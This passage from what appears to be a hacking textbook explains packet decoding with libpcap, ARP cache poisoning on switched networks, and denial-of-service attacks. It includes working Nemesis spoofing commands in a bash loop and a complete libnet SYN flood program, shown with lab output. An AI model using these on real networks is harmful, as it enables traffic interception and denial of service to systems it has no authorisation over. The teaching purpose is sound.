calculate the header size, we\u2019ll split\nthe byte containing it, assuming little-endian host byte ordering.\nThe th_flags field of Linux\u2019s tcphdr structure is defined as an 8-bit unsigned\ncharacter. The values defined below this field are the bitmasks that correspond\nunsigned short tcp_dest_port;  // Destination TCP port\nunsigned int tcp_seq;          // TCP sequence number\nunsigned int tcp_ack;          // TCP acknowledgment number\nunsigned char reserved:4;      // 4 bits from the 6 bits of reserved space\nunsigned char tcp_offset:4;    // TCP data offset for little-endian host\nunsigned char tcp_flags;       // TCP flags (and 2 bits from reserved space)\nunsigned short tcp_urgent;     // TCP urgent pointer\nNow that the headers are defined as structures, we can write a program\nto decode the layered headers of each packet. But before we do, let\u2019s talk\nabout libpcap for a moment. This library has a function called pcap_loop(),\nwhich is a better way to capture packets than just looping on a pcap_next()\ncall. Very few programs actually use pcap_next(), because it\u2019s clumsy and\ninefficient. The pcap_loop() function uses a callback function. This means\nthe pcap_loop() function is passed a function pointer, which is called every\ntime a packet is captured. The prototype for pcap_loop() is as follows:\nint pcap_loop(pcap_t *handle, int count, pcap_handler callback, u_char *args);\nThe first argument is the pcap\u2019s handle, the next one is a count of how\nmany packets to capture, and the third is a function pointer to the callback\nfunction. If the count argument is set to -1, it will loop until the program\nbreaks out of it. The final argument is an optional pointer that will get\npassed to the callback function. Naturally, the callback function needs to\nfollow a certain prototype, since pcap_loop() must call this function. The\ncallback function can be named whatever you like, but the arguments must\nvoid callback(u_char *args, const struct pcap_pkthdr *cap_header, const u_char *packet);\nThe first argument is just the optional argument pointer from the last\nargument to pcap_loop(). It can be used to pass additional information to the\ncallback function, but we aren\u2019t going to be using this. The next two arguments\nshould be familiar from pcap_next(): a pointer to the capture header and a\nThe following example code uses pcap_loop() with a callback function to\ncapture packets and our header structures to decode them. This program will\nvoid caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);\npcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\nAt the beginning of this program, the prototype for the callback func-\ntion, called caught_packet(), is declared along with several decoding functions.\nEverything else in main() is basically the same, except that the for loop has\nbeen replaced with a single call to pcap_loop(). This function is passed the\npcap_handle, told to capture three packets, and pointed to the callback func-\ntion, caught_packet(). The final argument is NULL, since we don\u2019t have any addi-\ntional data to pass along to caught_packet(). Also, notice that the decode_tcp()\nfunction returns a u_int. Since the TCP header length is variable, this function\nvoid caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char\nint tcp_header_length, total_header_size, pkt_data_len;\nprintf(\"==== Got a %d byte packet ====\\n\", cap_header->len);\ntcp_header_length = decode_tcp(packet+ETHER_HDR_LEN+sizeof(struct ip_hdr));\ntotal_header_size = ETHER_HDR_LEN+sizeof(struct ip_hdr)+tcp_header_length;\npkt_data = (u_char *)packet + total_header_size;  // pkt_data points to the data portion.\npkt_data_len = cap_header->len - total_header_size;\nprintf(\"\\t\\t\\t%u bytes of packet data\\n\", pkt_data_len);\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\nprintf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\nThe caught_packet() function gets called whenever pcap_loop() captures a\npacket. This function uses the header lengths to split the packet up by layers\nand the decoding functions to print out details of each layer\u2019s header.\nethernet_header = (const struct ether_hdr *)header_start;\nprintf(\"[ Source: %02x\", ethernet_header->ether_src_addr[0]);\nprintf(\":%02x\", ethernet_header->ether_src_addr[i]);\nprintf(\"\\tDest: %02x\", ethernet_header->ether_dest_addr[0]);\nprintf(\":%02x\", ethernet_header->ether_dest_addr[i]);\nprintf(\"\\tType: %hu ]\\n\", ethernet_header->ether_type);\nprintf(\"\\t( Source: %s\\t\", inet_ntoa(ip_header->ip_src_addr));\nprintf(\"Dest: %s )\\n\", inet_ntoa(ip_header->ip_dest_addr));\nprintf(\"\\t( Type: %u\\t\", (u_int) ip_header->ip_type);\nprintf(\"ID: %hu\\tLength: %hu )\\n\", ntohs(ip_header->ip_id), ntohs(ip_header->ip_len));\nprintf(\"\\t\\t{ Src Port: %hu\\t\", ntohs(tcp_header->tcp_src_port));\nprintf(\"Dest Port: %hu }\\n\", ntohs(tcp_header->tcp_dest_port));\nprintf(\"\\t\\t{ Seq #: %u\\t\", ntohl(tcp_header->tcp_seq));\nprintf(\"Ack #: %u }\\n\", ntohl(tcp_header->tcp_ack));\nprintf(\"\\t\\t{ Header Size: %u\\tFlags: \", header_size);\nThe decoding functions are passed a pointer to the start of the header,\nwhich is typecast to the appropriate structure. This allows accessing various\nfields of the header, but it\u2019s important to remember these values will be in\nnetwork byte order. This data is straight from the wire, so the byte order\nreader@hacking:~/booksrc $ gcc -o decode_sniff decode_sniff.c -lpcap\n[ Source: 00:01:29:15:65:b6     Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n74 65 73 74 69 6e 67 0d 0a                      | testing..\n[ Source: 00:01:6c:eb:1d:50     Dest: 00:01:29:15:65:b6 Type: 8 ]\n( Source: 192.168.42.249        Dest: 192.168.42.1 )\n[ Source: 00:01:29:15:65:b6     Dest: 00:01:6c:eb:1d:50 Type: 8 ]\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | this is a test..\nWith the headers decoded and separated into layers, the TCP/IP connec-\ntion is much easier to understand. Notice which IP addresses are associated with\nwhich MAC address. Also, notice how the sequence number in the two packets\nfrom 192.168.42.1 (the first and last packet) increases by nine, since the first\npacket contained nine bytes of actual data: 2887045283 \u2013 2887045274 = 9.\nThis is used by the TCP protocol to make sure all of the data arrives in order,\nsince packets could be delayed for various reasons.\nDespite all of the mechanisms built into the packet headers, the packets\nare still visible to anyone on the same network segment. Protocols such as\nFTP, POP3, and telnet transmit data without encryption. Even without the\nassistance of a tool like dsniff, it\u2019s fairly trivial for an attacker sniffing the\nnetwork to find the usernames and passwords in these packets and use them\nto compromise other systems. From a security perspective, this isn\u2019t too good,\nso more intelligent switches provide switched network environments.\nIn a switched network environment, packets are only sent to the port they are\ndestined for, according to their destination MAC addresses. This requires\nmore intelligent hardware that can create and maintain a table associating\nMAC addresses with certain ports, depending on which device is connected\nThe advantage of a switched environment is that devices are only sent\npackets that are meant for them, so that promiscuous devices aren\u2019t able to\nsniff any additional packets. But even in a switched environment, there are\nclever ways to sniff other devices\u2019 packets; they just tend to be a bit more\ncomplex. In order to find hacks like these, the details of the protocols must\nOne important aspect of network communications that can be manip-\nulated for interesting effects is the source address. There\u2019s no provision in\nthese protocols to ensure that the source address in a packet really is the\naddress of the source machine. The act of forging a source address in a packet\nis known as spoofing. The addition of spoofing to your bag of tricks greatly\nincreases the number of possible hacks, since most systems expect the source\nSpoofing is the first step in sniffing packets on a switched network. The\nother two interesting details are found in ARP. First, when an ARP reply comes\nin with an IP address that already exists in the ARP cache, the receiving system\nwill overwrite the prior MAC address information with the new information\nfound in the reply (unless that entry in the ARP cache was explicitly marked\nas permanent). Second, no state information about the ARP traffic is kept,\nsince this would require additional memory and would complicate a protocol\nthat is meant to be simple. This means systems will accept an ARP reply even\nThese three details, when exploited properly, allow an attacker to sniff\nnetwork traffic on a switched network using a technique known as ARP\nredirection. The attacker sends spoofed ARP replies to certain devices that cause\nthe ARP cache entries to be overwritten with the attacker\u2019s data. This tech-\nnique is called ARP cache poisoning. In order to sniff network traffic between\ntwo points, A and B, the attacker needs to poison the ARP cache of A to\ncause A to believe that B\u2019s IP address is at the attacker\u2019s MAC address, and\nalso poison the ARP cache of B to cause B to believe that A\u2019s IP address is also\nat the attacker\u2019s MAC address. Then the attacker\u2019s machine simply needs to\nforward these packets to their appropriate final destinations. After that, all\nof the traffic between A and B still gets delivered, but it all flows through the\nSince A and B are wrapping their own Ethernet headers on their packets\nbased on their respective ARP caches, A\u2019s IP traffic meant for B is actually sent\nto the attacker\u2019s MAC address, and vice versa. The switch only filters traffic\nbased on MAC address, so the switch will work as it\u2019s designed to, sending A\u2019s\nand B\u2019s IP traffic, destined for the attacker\u2019s MAC address, to the attacker\u2019s\nport. Then the attacker rewraps the IP packets with the proper Ethernet\nheaders and sends them back to the switch, where they are finally routed to\ntheir proper destination. The switch works properly; it\u2019s the victim machines\nthat are tricked into redirecting their traffic through the attacker\u2019s machine.\nDue to timeout values, the victim machines will periodically send out real\nARP requests and receive real ARP replies in response. In order to maintain\nthe redirection attack, the attacker must keep the victim machine\u2019s ARP caches\npoisoned. A simple way to accomplish this is to send spoofed ARP replies to\nboth A and B at a constant interval\u2014for example, every 10 seconds.\nA gateway is a system that routes all the traffic from a local network out to\nthe Internet. ARP redirection is particularly interesting when one of the victim\nmachines is the default gateway, since the traffic between the default gateway\nand another system is that system\u2019s Internet traffic. For example, if a machine\nat 192.168.0.118 is communicating with the gateway at 192.168.0.1 over a\nswitch, the traffic will be restricted by MAC address. This means that this\ntraffic cannot normally be sniffed, even in promiscuous mode. In order to\nTo redirect the traffic, first the MAC addresses of 192.168.0.118 and\n192.168.0.1 need to be determined. This can be done by pinging these hosts,\nsince any IP connection attempt will use ARP. If you run a sniffer, you can\nsee the ARP communications, but the OS will cache the resulting IP/MAC\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.1\n64 octets from 192.168.0.1: icmp_seq=0 ttl=64 time=0.4 ms\n1 packets transmitted, 1 packets received, 0% packet loss\nreader@hacking:~/booksrc $ ping -c 1 -w 1 192.168.0.118\n64 octets from 192.168.0.118: icmp_seq=0 ttl=128 time=0.4 ms\n1 packets transmitted, 1 packets received, 0% packet loss\n? (192.168.0.1) at 00:50:18:00:0F:01 [ether] on eth0\n? (192.168.0.118) at 00:C0:F0:79:3D:30 [ether] on eth0\neth0      Link encap:Ethernet  HWaddr 00:00:AD:D1:C7:ED\ninet addr:192.168.0.193  Bcast:192.168.0.255  Mask:255.255.255.0\nUP BROADCAST NOTRAILERS RUNNING  MTU:1500  Metric:1\nRX packets:4153 errors:0 dropped:0 overruns:0 frame:0\nTX packets:3875 errors:0 dropped:0 overruns:0 carrier:0\nRX bytes:601686 (587.5 Kb)  TX bytes:288567 (281.8 Kb)\nAfter pinging, the MAC addresses for both 192.168.0.118 and 192.168.0.1\nare in the attacker\u2019s ARP cache. This way, packets can reach their final\ndestinations after being redirected to the attacker\u2019s machine. Assuming IP\nforwarding capabilities are compiled into the kernel, all we need to do is\nsend some spoofed ARP replies at regular intervals. 192.168.0.118 needs to\nbe told that 192.168.0.1 is at 00:00:AD:D1:C7:ED, and 192.168.0.1 needs to be\ntold that 192.168.0.118 is also at 00:00:AD:D1:C7:ED. These spoofed ARP packets\ncan be injected using a command-line packet injection tool called Nemesis.\nNemesis was originally a suite of tools written by Mark Grimes, but in the\nmost recent version 1.4, all functionality has been rolled up into a single\nutility by the new maintainer and developer, Jeff Nathan. The source code\nfor Nemesis is on the LiveCD at /usr/src/nemesis-1.4/, and it has already\nNEMESIS -=- The NEMESIS Project Version 1.4 (Build 26)\nTo display options, specify a mode with the option \"help\".\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n-s <Solaris style ARP requests with target hardware addess set to broadcast>\nYou must define a Source and Destination IP address.\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D\n192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB\nreader@hacking:~/booksrc $ sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D\n192.168.0.1 -h  00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nThese two commands spoof ARP replies from 192.168.0.1 to 192.168.0.118\nand vice versa, both claiming that their MAC address is at the attacker\u2019s MAC\naddress of 00:00:AD:D1:C7:ED. If these commands are repeated every 10 seconds,\nthese bogus ARP replies will continue to keep the ARP caches poisoned and\nthe traffic redirected. The standard BASH shell allows commands to be\nscripted, using familiar control flow statements. A simple BASH shell while\nloop is used below to loop forever, sending our two poisoning ARP replies\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h\n00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M\n> sudo nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h\n00:00:AD:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:C0:F0:79:3D:30\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nARP/RARP Packet Injection -=- The NEMESIS Project Version 1.4 (Build 26)\n[Hardware addr:MAC] 00:00:AD:D1:C7:ED > 00:50:18:00:0F:01\nWrote 42 byte unicast ARP request packet through linktype DLT_EN10MB.\nYou can see how something as simple as Nemesis and the standard BASH\nshell can be used to quickly hack together a network exploit. Nemesis uses a\nC library called libnet to craft spoofed packets and inject them. Similar to\nlibpcap, this library uses raw sockets and evens out the inconsistencies between\nplatforms with a standardized interface. libnet also provides several convenient\nfunctions for dealing with network packets, such as checksum generation.\nThe libnet library provides a simple and uniform API to craft and inject\nnetwork packets. It\u2019s well documented and the functions have descriptive\nnames. A high-level glance at the source code for Nemesis shows how easy it\nis to craft ARP packets using libnet. The source file nemesis-arp.c contains\nseveral functions for crafting and injecting ARP packets, using statically defined\ndata structures for the packet header information. The nemesis_arp() function\nshown below is called in nemesis.c to build and inject an ARP packet.\nif (builddatafromfile(ARPBUFFSIZE, &pd, (const char *)file,\nif (buildarp(&etherhdr, &arphdr, &pd, device, reply) < 0)\nprintf(\"\\n%s Injection Failure\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));\nprintf(\"\\n%s Packet Injected\\n\", (rarp == 0 ? \"ARP\" : \"RARP\"));\nThe structures ETHERhdr and ARPhdr are defined in the file nemesis.h (shown\nbelow) as aliases for existing libnet data structures. In C, typedef is used to alias\nThe nemesis_arp() function calls a series of other functions from this file:\narp_initdata(), arp_cmdline(), arp_validatedata(), and arp_verbose(). You can\nprobably guess that these functions initialize data, process command-line argu-\nments, validate data, and do some sort of verbose reporting. The arp_initdata()\nfunction does exactly this, initializing values in statically declared data\nThe arp_initdata() function, shown below, sets various elements of the\nheader structures to the appropriate values for an ARP packet.\netherhdr.ether_type = ETHERTYPE_ARP; /* Ethernet type ARP */\nmemset(etherhdr.ether_dhost, 0xff, 6); /* Ethernet destination address */\nFinally, the nemesis_arp() function calls the function buildarp() with\npointers to the header data structures. Judging from the way the return value\nfrom buildarp() is handled here, buildarp() builds the packet and injects it.\nThis function is found in yet another source file, nemesis-proto_arp.c.\nint buildarp(ETHERhdr *eth, ARPhdr *arp, FileData *pd, char *device,\narp_packetlen = LIBNET_ARP_H + LIBNET_ETH_H + pd->file_s;\nprintf(\"DEBUG: ARP packet length %u.\\n\", arp_packetlen);\nprintf(\"DEBUG: ARP payload size  %u.\\n\", pd->file_s);\nif ((l2 = libnet_open_link_interface(device, errbuf)) == NULL)\nnemesis_device_failure(INJECTION_LINK, (const char *)device);\nfprintf(stderr, \"ERROR: Unable to allocate packet memory.\\n\");\nlibnet_build_ethernet(eth->ether_dhost, eth->ether_shost, eth->ether_type,\nlibnet_build_arp(arp->ar_hrd, arp->ar_pro, arp->ar_hln, arp->ar_pln,\narp->ar_op, arp->ar_sha, arp->ar_spa, arp->ar_tha, arp->ar_tpa,\nn = libnet_write_link_layer(l2, device, pkt, LIBNET_ETH_H +\nnemesis_hexdump(pkt, arp_packetlen, HEX_ASCII_DECODE);\nnemesis_hexdump(pkt, arp_packetlen, HEX_RAW_DECODE);\nfprintf(stderr, \"ERROR: Incomplete packet injection.  Only \"\nprintf(\"Wrote %d byte unicast ARP request packet through \"\nprintf(\"Wrote %d byte %s packet through linktype %s.\\n\", n,\n(eth->ether_type == ETHERTYPE_ARP ? \"ARP\" : \"RARP\"),\nAt a high level, this function should be readable to you. Using libnet\nfunctions, it opens a link interface and initializes memory for a packet. Then,\nit builds the Ethernet layer using elements from the Ethernet header data\nstructure and then does the same for the ARP layer. Next, it writes the packet\nto the device to inject it, and finally cleans up by destroying the packet and\nclosing the interface. The documentation for these functions from the libnet\nlibnet_open_link_interface() opens a low-level packet interface. This is\nrequired to write link layer frames. Supplied is a u_char pointer to the\ninterface device name and a u_char pointer to an error buffer. Returned is a\nlibnet_init_packet() initializes a packet for use. If the size parameter is\nomitted (or negative) the library will pick a reasonable value for the user\n(currently LIBNET_MAX_PACKET). If the memory allocation is successful, the\nmemory is zeroed and the function returns 1. If there is an error, the\nfunction returns -1. Since this function calls malloc, you certainly should,\nat some point, make a corresponding call to destroy_packet().\nlibnet_build_ethernet() constructs an ethernet packet. Supplied is the\ndestination  address, source address (as arrays of unsigned characterbytes)\nand the ethernet frame type, a pointer to an optional data  payload, the\npayload  length, and a pointer to a pre-allocated block of memory for the\npacket. The ethernet packet type should be one  of the following:\nlibnet_build_arp() constructs an ARP (Address Resolution Protocol) packet.\nSupplied are the following: hardware address type, protocol address type, the\nhardware address length, the protocol address length, the ARP packet type, the\nsender hardware address, the sender protocol address, the target hardware\naddress, the target protocol address, the packet payload, the payload size,\nand finally, a pointer to the packet header memory. Note that this function\nonly builds ethernet/IP ARP packets, and consequently the first value should\nbe ARPHRD_ETHER. The ARP packet type should be one of the following:\nARPOP_REQUEST, ARPOP_REPLY, ARPOP_REVREQUEST, ARPOP_REVREPLY,\nlibnet_destroy_packet() frees the memory associated with the packet.\nlibnet_close_link_interface() closes an opened low-level packet interface.\nWith a basic understanding of C, API documentation, and common sense,\nyou can teach yourself just by examining open source projects. For example,\nDug Song provides a program called arpspoof, included with dsniff, that per-\narpspoof redirects packets from a target host (or all hosts) on the LAN\nintended for another host on the LAN by forging ARP replies. This is\nan extremely effective way of sniffing traffic on a switch.\nKernel IP forwarding (or a userland program which accomplishes the\nsame, e.g. fragrouter(8)) must be turned on ahead of time.\nSpecify a particular host to ARP poison (if not  specified, all\nhost   Specify  the host you wish to intercept packets for (usually the\nThe magic of this program comes from its arp_send() function, which also\nuses libnet to spoof packets. The source code for this function should be read-\nable to you, since many of the previously explained libnet functions are used\n(shown in bold below). The use of structures and an error buffer should also\nint op, u_char *sha, in_addr_t spa, u_char *tha, in_addr_t tpa)\n(sha = (u_char *)libnet_get_hwaddr(llif, dev, ebuf)) == NULL) {\nif ((spa = libnet_get_ipaddr(llif, dev, ebuf)) == 0)\nlibnet_build_ethernet(tha, sha, ETHERTYPE_ARP, NULL, 0, pkt);\nlibnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, ETHER_ADDR_LEN, 4,\nfprintf(stderr, \"%s 0806 42: arp who-has %s tell %s\\n\",\nreturn (libnet_write_link_layer(llif, dev, pkt, sizeof(pkt)) == sizeof(pkt));\nThe remaining libnet functions get hardware addresses, get the IP address,\nand look up hosts. These functions have descriptive names and are explained\nlibnet_get_hwaddr() takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. The function returns the MAC address of the specified interface upon\nsuccess or 0 upon error (and errbuf will contain a reason).\nlibnet_get_ipaddr() takes a pointer to a link layer interface struct, a\npointer to the network device name, and an empty buffer to be used in case of\nerror. Upon success the function returns the IP address of the specified\ninterface in host-byte order or 0 upon error (and errbuf will contain a\nlibnet_host_lookup() converts the supplied network-ordered (big-endian) IPv4\naddress into its human-readable counterpart. If use_name is 1,\nlibnet_host_lookup() will attempt to resolve this IP address and return a\nhostname, otherwise (or if the lookup fails), the function returns a dotted-\nOnce you\u2019ve learned how to read C code, existing programs can teach\nyou a lot by example. Programming libraries like libnet and libpcap have\nplenty of documentation that explains all the details you may not be able to\ndivine from the source alone. The goal here is to teach you how to learn\nfrom source code, as opposed to just teaching how to use a few libraries. After\nall, there are many other libraries and a lot of existing source code that\nOne of the simplest forms of network attack is a Denial of Service (DoS) attack.\nInstead of trying to steal information, a DoS attack simply prevents access to\na service or resource. There are two general forms of DoS attacks: those that\nDenial of Service attacks that crash services are actually more similar to\nprogram exploits than network-based exploits. Often, these attacks are depen-\ndent on a poor implementation by a specific vendor. A buffer overflow exploit\ngone wrong will usually just crash the target program instead of directing the\nexecution flow to the injected shellcode. If this program happens to be on a\nserver, then no one else can access that server after it has crashed. Crashing\nDoS attacks like this are closely tied to a certain program and a certain version.\nSince the operating system handles the network stack, crashes in this code\nwill take down the kernel, denying service to the entire machine. Many of\nthese vulnerabilities have long since been patched on modern operating\nsystems, but it\u2019s still useful to think about how these techniques might be\nA SYN flood tries to exhaust states in the TCP/IP stack. Since TCP maintains\n\u201creliable\u201d connections, each connection needs to be tracked somewhere. The\nTCP/IP stack in the kernel handles this, but it has a finite table that can only\ntrack so many incoming connections. A SYN flood uses spoofing to take\nThe attacker floods the victim\u2019s system with many SYN packets, using a\nspoofed nonexistent source address. Since a SYN packet is used to initiate a\nTCP connection, the victim\u2019s machine will send a SYN/ACK packet to the\nspoofed address in response and wait for the expected ACK response. Each\nof these waiting, half-open connections goes into a backlog queue that has\nlimited space. Since the spoofed source addresses don\u2019t actually exist, the\nACK responses needed to remove these entries from the queue and complete\nthe connections never come. Instead, each half-open connection must time\nAs long as the attacker continues to flood the victim\u2019s system with spoofed\nSYN packets, the victim\u2019s backlog queue will remain full, making it nearly\nimpossible for real SYN packets to get to the system and initiate valid TCP/IP\nUsing the Nemesis and arpspoof source code as reference, you should be\nable to write a program that performs this attack. The example program below\nuses libnet functions pulled from the source code and socket functions previ-\nously explained. The Nemesis source code uses the function libnet_get_prand()\nto obtain pseudo-random numbers for various IP fields. The function\nlibnet_seed_prand() is used to seed the randomizer. These functions are\n#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.\nreturn inet_ntoa( *((struct in_addr *)ip_addr_ptr) );\nint opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;\nprintf(\"Usage:\\n%s\\t <target host> <target port>\\n\", argv[0]);\ndest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // The host\nnetwork = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.\nlibnet_error(LIBNET_ERR_FATAL, \"can't open network interface.  -- this program must run\nlibnet_init_packet(packet_size, &packet); // Allocate memory for packet.\nlibnet_error(LIBNET_ERR_FATAL, \"can't initialize packet memory.\\n\");\nlibnet_seed_prand(); // Seed the random number generator.\nprintf(\"SYN Flooding port %d of %s..\\n\", dest_port, print_ip(&dest_ip));\nlibnet_build_ip(LIBNET_TCP_H,      // Size of the packet sans IP header.\nlibnet_get_prand(LIBNET_PRu16), // IP ID (randomized)\nlibnet_get_prand(LIBNET_PR8),   // TTL (randomized)\nIPPROTO_TCP,                    // Transport protocol\nlibnet_get_prand(LIBNET_PRu32), // Source IP (randomized)\npacket);                        // Packet header memory\nlibnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)\ndest_port,                      // Destination TCP port\nlibnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)\nlibnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)\nTH_SYN,                         // Control flags (SYN flag set only)\nlibnet_get_prand(LIBNET_PRu16), // Window size (randomized)\npacket + LIBNET_IP_H);          // Packet header memory\nif (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)\nlibnet_error(LIBNET_ERR_FATAL, \"can't compute checksum\\n\");\nbyte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.\nlibnet_error(LIBNET_ERR_WARNING, \"Warning: Incomplete packet written.  (%d of %d\nusleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.\nlibnet_destroy_packet(&packet); // Free packet memory.\nif (libnet_close_raw_sock(network) == -1) // Close the network interface.\nlibnet_error(LIBNET_ERR_WARNING, \"can't close network interface.\");\nThis program uses a print_ip() function to handle converting the\nu_long type, used by libnet to store IP addresses, to the struct type expected\nby inet_ntoa(). The value doesn\u2019t change\u2014the typecasting just appeases the\nThe current release of libnet is version 1.1, which is incompatible with\nlibnet 1.0. However, Nemesis and arpspoof still rely on the 1.0 version of\nlibnet, so this version is included in the LiveCD and this is also what we will\nuse in our synflood program.  Similar to compiling with libpcap, when compil-\ning with libnet, the flag -lnet is used.  However, this isn\u2019t quite enough infor-\nmation for the compiler, as the output below shows.\nreader@hacking:~/booksrc $ gcc -o synflood synflood.c -lnet\n/usr/include/libnet.h:87:2: #error \"byte order has not been specified, you'll\"\nsynflood.c:6: error: syntax error before string constant\nThe compiler still fails because several mandatory define flags need to be\nset for libnet. Included with libnet, a program called libnet-config will output\n-D_BSD_SOURCE -D__BSD_SOURCE -D__FAVOR_BSD -DHAVE_NET_ETHERNET_H\nUsing the BASH shell\u2019s command substitution in both, these defines can\nreader@hacking:~/booksrc $ gcc $(libnet-config --defines) -o synflood\nreader@hacking:~/booksrc $ ./synflood 192.168.42.88 22\nFatal: can't open network interface.  -- this program must run as root.\nreader@hacking:~/booksrc $ sudo ./synflood 192.168.42.88 22\nIn the example above, the host 192.168.42.88 is a Windows XP machine\nrunning an openssh server on port 22 via cygwin. The tcpdump output below\nshows the spoofed SYN packets flooding the host from apparently random\nIPs. While the program is running, legitimate connections cannot be made\nreader@hacking:~/booksrc $ sudo tcpdump -i eth0 -nl -c 15 \"host 192.168.42.88\"\ntcpdump: verbose output suppressed, use -v or -vv for full protocol decode\nlistening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes\n17:08:16.334498 IP 121.213.150.59.4584 > 192.168.42.88.22: S\n17:08:16.346907 IP 158.78.184.110.40565 > 192.168.42.88.22: S\n17:08:16.358491 IP 53.245.19.50.36638 > 192.168.42.88.22: S\n17:08:16.370492 IP 91.109.238.11.4814 > 192.168.42.88.22: S\n17:08:16.382492 IP 52.132.214.97.45099 > 192.168.42.88.22: S\n17:08:16.394909 IP 120.112.199.34.19452 > 192.168.42.88.22: S\n17:08:16.406491 IP 60.9.221.120.21573 > 192.168.42.88.22: S\n17:08:16.418494 IP 137.101.201.0.54665 > 192.168.42.88.22: S\n17:08:16.430497 IP 188.5.248.61.8409 > 192.168.42.88.22: S\n17:08:16.442911 IP 44.71.67.65.60484 > 192.168.42.88.22: S\n17:08:16.454489 IP 218.66.249.126.27982 > 192.168.42.88.22: S\n17:08:16.466493 IP 131.238.172.7.15390 > 192.168.42.88.22: S\n17:08:16.478497 IP 130.246.104.88.48221 > 192.168.42.88.22: S\n17:08:16.490908 IP 140.187.48.68.9179 > 192.168.42.88.22: S\n17:08:16.502498 IP 33.172.101.123.44358 > 192.168.42.88.22: S\ndebug1: Reading configuration data /etc/ssh/ssh_config\ndebug1: Connecting to 192.168.42.88 [192.168.42.88] port 22.\ndebug1: connect to address 192.168.42.88 port 22: Connection refused\nssh: connect to host 192.168.42.88 port 22: Connection refused\nSome operating systems (for example, Linux) use a technique called\nsyncookies to try to prevent SYN flood attacks. The TCP stack using syncookies\nadjusts the initial acknowledgment number for the responding SYN/ACK\npacket using a value based on host details and time (to prevent replay attacks).\nThe TCP connections don\u2019t actually become active until the final ACK packet\nfor the TCP handshake is checked. If the sequence number doesn\u2019t match\nor the ACK never arrives, a connection is never created. This helps prevent\nspoofed connection attempts, since the ACK packet requires information to\nbe sent to the source address of the initial SYN packet.\nAccording to the specification for ICMP, ICMP echo messages can only have\n216, or 65,536, bytes of data in the data part of the packet. The data portion\nof ICMP packets is commonly overlooked, since the important information is\nin the header. Several operating systems crashed if they were sent ICMP echo\nmessages that exceeded the size specified. An ICMP echo message of this gar-\ngantuan size became affectionately known as \u201cThe Ping of Death.\u201d It was a\nvery simple hack exploiting a vulnerability that existed because no one ever\nconsidered this possibility. It should be easy for you to write a program using\nlibnet that can perform this attack; however, it won\u2019t be that useful in the\nreal world. Modern systems are all patched against this vulnerability.\nHowever, history tends to repeat itself. Even though oversized ICMP\npackets won\u2019t crash computers anymore, new technologies sometimes\nsuffer from similar problems. The Bluetooth protocol, commonly used with\nphones, has a similar ping packet on the L2CAP layer, which is also used to\nmeasure the communication time on established links. Many implementations\nof Bluetooth suffer from the same oversized ping packet problem. Adam\nLaurie, Marcel Holtmann, and Martin Herfurt have dubbed this attack\nBluesmack and have released source code by the same name that performs\nAnother crashing DoS attack that came about for the same reason was called\nteardrop. Teardrop exploited another weakness in several vendors\u2019 implemen-\ntations of IP fragmentation reassembly. Usually, when a packet is fragmented,\nthe offsets stored in the header will line up to reconstruct the original packet\nwith no overlap. The teardrop attack sent packet fragments with overlapping\noffsets, which caused implementations that didn\u2019t check for this irregular\nAlthough this specific attack doesn\u2019t work anymore, understanding the\nconcept can reveal problems in other areas. Although not limited to a Denial\nof Service, a recent remote exploit in the OpenBSD kernel (which prides\nitself on security) had to do with fragmented IPv6 packets. IP version 6 uses\nmore complicated headers and even a different IP address format than the\nIPv4 most people are familiar with. Often, the same mistakes made in the\npast are repeated by early implementations of new products.\nFlooding DoS attacks don\u2019t try to necessarily crash a service or resource, but\ninstead try to overload it so it can\u2019t respond. Similar attacks can tie up other\nresources, such as CPU cycles and system processes, but a flooding attack\nThe simplest form of flooding is just a ping flood. The goal is to use up\nthe victim\u2019s bandwidth so that legitimate traffic can\u2019t get through. The attacker\nsends many large ping packets to the victim, which eat away at the bandwidth\nThere\u2019s nothing really clever about this attack\u2014it\u2019s just a battle of band-\nwidth. An attacker with greater bandwidth than a victim can send more data\nthan the victim can receive and therefore deny other legitimate 